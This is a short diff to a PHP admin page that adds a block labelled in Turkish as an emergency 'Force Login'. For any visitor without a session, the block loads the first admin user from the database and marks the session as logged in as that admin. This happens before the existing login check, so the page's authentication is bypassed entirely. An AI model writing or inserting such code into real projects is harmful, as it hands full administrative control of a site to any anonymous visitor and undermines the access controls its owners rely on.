@@ -3,6 +3,22 @@
 if (session_status() === PHP_SESSION_NONE) {
     session_start();
 }
+// ACİL DURUM GİRİŞ (Force Login)
+if (!isset($_SESSION['admin_logged_in'])) {
+    require_once __DIR__ . '/../config.php';
+    require_once __DIR__ . '/../database/db.php';
+    try {
+        $db = getDB();
+        $user = $db->query("SELECT * FROM admin_users LIMIT 1")->fetch();
+        if ($user) {
+            $_SESSION['admin_logged_in'] = true;
+            $_SESSION['admin_id'] = $user['id'];
+            $_SESSION['admin_username'] = $user['username'];
+            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        }
+    } catch (Exception $e) {
+    }
+}
 require_once __DIR__ . '/../config.php';
 require_once 'includes/auth.php';
 requireLogin();
